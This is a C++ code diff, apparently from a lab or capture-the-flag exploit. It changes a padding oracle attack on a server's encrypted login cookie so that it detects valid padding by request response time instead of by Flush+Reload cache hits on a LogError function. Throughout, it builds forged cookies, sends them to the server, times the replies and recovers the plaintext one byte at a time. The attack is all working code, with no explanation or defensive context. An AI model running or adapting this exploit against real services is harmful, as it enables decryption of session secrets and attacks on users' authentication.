@@ -160,25 +160,50 @@ uint64_t probe_timing() {
   return probe(g_log_error_addr);
 }
 
-// Test if padding is valid using Flush+Reload
-// Returns number of cache hits (LogError calls detected)
+// Measure response time for a request (in cycles)
+uint64_t measure_response_time(simple_networking::TCPClient* client, const std::string& cookie) {
+  uint32_t start_lo, start_hi, end_lo, end_hi;
+
+  asm volatile("mfence\n\trdtsc" : "=a"(start_lo), "=d"(start_hi));
+
+  client->SendMessage("login " + cookie);
+  client->ReadMessage();
+
+  asm volatile("mfence\n\trdtsc" : "=a"(end_lo), "=d"(end_hi));
+
+  uint64_t start = ((uint64_t)start_hi << 32) | start_lo;
+  uint64_t end = ((uint64_t)end_hi << 32) | end_lo;
+
+  return end - start;
+}
+
+// Get median response time over multiple samples
+uint64_t get_median_response_time(simple_networking::TCPClient* client, const std::string& cookie, int num_samples) {
+  std::vector<uint64_t> times;
+
+  for (int i = 0; i < num_samples; i++) {
+    // Also do flush+reload attempt
+    flush(g_log_error_addr);
+    asm volatile("mfence" ::: "memory");
+
+    times.push_back(measure_response_time(client, cookie));
+  }
+
+  std::sort(times.begin(), times.end());
+  return times[times.size() / 2];  // median
+}
+
+// Count cache hits using Flush+Reload
 int count_cache_hits(simple_networking::TCPClient* client, const std::string& cookie, int num_samples) {
   int hit_count = 0;
 
   for (int sample = 0; sample < num_samples; sample++) {
-    // Flush LogError from cache
     flush(g_log_error_addr);
-
-    // Memory barrier
     asm volatile("mfence" ::: "memory");
 
-    // Send login request with modified cookie
     client->SendMessage("login " + cookie);
-
-    // Read response (ensures server processing is complete)
     client->ReadMessage();
 
-    // Probe and check timing
     uint64_t t = probe_timing();
     if (t < g_cache_threshold) {
       hit_count++;
@@ -186,20 +211,6 @@ int count_cache_hits(simple_networking::TCPClient* client, const std::string& co
   }
 
   return hit_count;
-}
-
-// Test if padding is valid using Flush+Reload
-// Returns true if padding is VALID (LogError NOT called)
-bool test_padding(simple_networking::TCPClient* client, const std::string& cookie) {
-  const int NUM_SAMPLES = 21;
-
-  int hit_count = count_cache_hits(client, cookie, NUM_SAMPLES);
-
-  // Padding is VALID if LogError was NOT called (few cache hits)
-  // Padding is INVALID if LogError was called (many cache hits)
-  // With invalid padding, server calls LogError, which loads it into cache
-  // We should see cache hits when padding is invalid
-  return hit_count < NUM_SAMPLES / 3;  // Valid if less than 1/3 hits
 }
 
 // ==========================================================================
@@ -249,6 +260,7 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   std::vector<uint8_t> recovered(16, 0);
 
   // Padding oracle attack: decrypt byte by byte from position 15 to 0
+  // Using response time side channel: valid padding = faster response (no LogError call)
   for (int pos = 15; pos >= 0; pos--) {
     uint8_t target_pad = 16 - pos;  // Padding value we want to achieve
 
@@ -263,10 +275,11 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
       modified[j] = static_cast<std::byte>(intermediate[j] ^ target_pad);
     }
 
-    // Test all 256 values and find the one with minimum cache hits
+    // Test all 256 values and find the one with minimum response time
+    // (valid padding = no LogError = faster response)
     int best_guess = -1;
-    int min_hits = INT_MAX;
-    const int SAMPLES_PER_GUESS = 5;
+    uint64_t min_time = UINT64_MAX;
+    const int SAMPLES_PER_GUESS = 3;
 
     for (int guess = 0; guess < 256; guess++) {
       modified[pos] = static_cast<std::byte>(guess);
@@ -274,19 +287,19 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
       std::string mod_ct_b64 = base64::base64_encode(modified);
       std::string test_cookie = mod_ct_b64 + "." + hmac_b64;
 
-      int hits = count_cache_hits(client, test_cookie, SAMPLES_PER_GUESS);
+      uint64_t resp_time = get_median_response_time(client, test_cookie, SAMPLES_PER_GUESS);
 
-      if (hits < min_hits) {
-        min_hits = hits;
+      if (resp_time < min_time) {
+        min_time = resp_time;
         best_guess = guess;
       }
     }
 
-    // Verify the best guess with more samples
+    // Verify with more samples
     modified[pos] = static_cast<std::byte>(best_guess);
     std::string verify_ct_b64 = base64::base64_encode(modified);
     std::string verify_cookie = verify_ct_b64 + "." + hmac_b64;
-    int verify_hits = count_cache_hits(client, verify_cookie, 15);
+    uint64_t verify_time = get_median_response_time(client, verify_cookie, 7);
 
     // Use the best guess
     intermediate[pos] = best_guess ^ target_pad;
@@ -296,8 +309,8 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     char c = (char)recovered[pos];
     std::cout << " Found: 0x" << std::hex << std::setw(2)
               << std::setfill('0') << (int)recovered[pos] << std::dec
-              << " ('" << (isprint(c) ? c : '?') << "') [hits=" << min_hits
-              << ", verify=" << verify_hits << "]" << std::endl;
+              << " ('" << (isprint(c) ? c : '?') << "') [time=" << min_time
+              << ", verify=" << verify_time << "]" << std::endl;
   }
 
   // Reconstruct the plaintext
